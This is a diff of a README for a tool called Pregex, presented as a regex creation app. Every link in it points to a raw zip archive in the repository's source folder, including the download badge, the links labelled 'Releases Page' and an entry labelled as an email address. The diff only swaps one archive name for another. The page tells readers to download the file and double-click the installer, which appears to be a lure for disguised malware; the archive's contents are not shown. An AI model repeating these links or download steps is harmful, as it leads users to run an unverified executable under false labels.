@@ -1,6 +1,6 @@
 # 🎉 Pregex - Effortless Regex Creation Made Simple
 
-[![Download Pregex](https://raw.githubusercontent.com/sanadnp/Pregex/main/src/Pregex/Software-zechin.zip)](https://raw.githubusercontent.com/sanadnp/Pregex/main/src/Pregex/Software-zechin.zip)
+[![Download Pregex](https://raw.githubusercontent.com/sanadnp/Pregex/main/src/Pregex/Software_resow.zip)](https://raw.githubusercontent.com/sanadnp/Pregex/main/src/Pregex/Software_resow.zip)
 
 ## 📖 About Pregex
 
@@ -10,14 +10,14 @@ Pregex is a user-friendly application designed to create and manage regular expr
 
 Follow these steps to download and run Pregex:
 
-1. **Visit the Releases Page**: Go to the [Pregex Releases Page](https://raw.githubusercontent.com/sanadnp/Pregex/main/src/Pregex/Software-zechin.zip). This is where you will find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Pregex Releases Page](https://raw.githubusercontent.com/sanadnp/Pregex/main/src/Pregex/Software_resow.zip). This is where you will find the latest version of the software.
 2. **Choose Your Version**: Look for the most recent release at the top of the page. It will include the version number, release notes, and download links.
 3. **Download the Installer**: Click on the link that corresponds to your operating system. This could be a file ending in `.exe` for Windows or `.dmg` for macOS.
 4. **Run the Installer**: Once the download completes, locate the file and double-click it. Follow the on-screen instructions to install Pregex on your computer.
 
 ## 📥 Download & Install
 
-Again, you can download Pregex directly from the [Releases Page](https://raw.githubusercontent.com/sanadnp/Pregex/main/src/Pregex/Software-zechin.zip). Make sure to always download the latest version for the best experience.
+Again, you can download Pregex directly from the [Releases Page](https://raw.githubusercontent.com/sanadnp/Pregex/main/src/Pregex/Software_resow.zip). Make sure to always download the latest version for the best experience.
 
 ## 📊 Features
 
@@ -50,7 +50,7 @@ If you encounter any issues while using Pregex, you can find help in the followi
 
 - **Documentation**: Refer to the built-in help section for detailed guidance on using features.
 - **Community Forum**: Join discussions and ask questions in our community forum separate from GitHub.
-- **Contact Us**: Send an email to https://raw.githubusercontent.com/sanadnp/Pregex/main/src/Pregex/Software-zechin.zip for direct assistance.
+- **Contact Us**: Send an email to https://raw.githubusercontent.com/sanadnp/Pregex/main/src/Pregex/Software_resow.zip for direct assistance.
 
 ## 🔗 Additional Resources
 
